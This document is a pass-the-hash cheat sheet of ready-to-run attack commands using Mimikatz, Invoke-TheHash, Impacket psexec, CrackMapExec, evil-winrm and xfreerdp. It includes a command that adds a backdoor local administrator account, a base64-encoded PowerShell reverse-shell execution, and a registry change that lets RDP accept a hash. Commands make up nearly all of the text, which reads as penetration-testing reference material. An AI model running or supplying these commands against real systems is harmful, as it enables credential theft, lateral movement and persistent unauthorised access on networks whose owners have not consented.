# Pass the Hash

## Mimikatz

```batch
mimikatz.exe "privilege::debug" "sekurlsa::pth /user:<user> /rc4:<hash> /domain:<domain> /run:cmd.exe" "exit"
```

## Invoke-TheHash

### SMBExec

```powershell
Import-Module .\Invoke-TheHash.psd1
Invoke-SMBExec -Target <ip> -Domain <domain> -Username <user> -Hash <hash> -Command "net user attacker Password123 /add && net localgroup administrators attacker /add" -Verbose
```

### WMIExec with reverse shell

Create a reverse shell using [RevShells](https://www.revshells.com/).

```powershell
Import-Module .\Invoke-TheHash.psd1
Invoke-WMIExec -Target <target> -Domain <domain> -Username <user> -Hash <hash> -Command "powershell -e <base64 encoded payload>"
```

## Impacket

### PsExec

```bash
impacket-psexec <user>@<ip> -hashes :<hash>
```

## CrackMapExec

```bash
crackmapexec smb <ip> -u <user> -d . -H <hash>
```

:::info Local Authentication

If we want to perform the same actions but attempt to authenticate to each host in a subnet using the local administrator password hash, we could add `--local-auth` to our command.

:::

## evil-winrm

```bash
evil-winrm -i <ip> -u <user> -H <hash>
```

## RDP with GUI

:::caution Restricted Admin Mode

Restricted Admin Mode, which is disabled by default, should be enabled on the target host.

This can be enabled by adding a new registry key `DisableRestrictedAdmin (REG_DWORD)` under `HKEY_LOCAL_MACHINE\System\CurrentControlSet\Control\Lsa` with the value of `0`. It can be done using the following command:

```batch
reg add HKLM\System\CurrentControlSet\Control\Lsa /t REG_DWORD /v DisableRestrictedAdmin /d 0x0 /f
```

:::

### xfreerdp

```bash
xfreerdp /v:<ip> /u:<user> /pth:<hash>
```
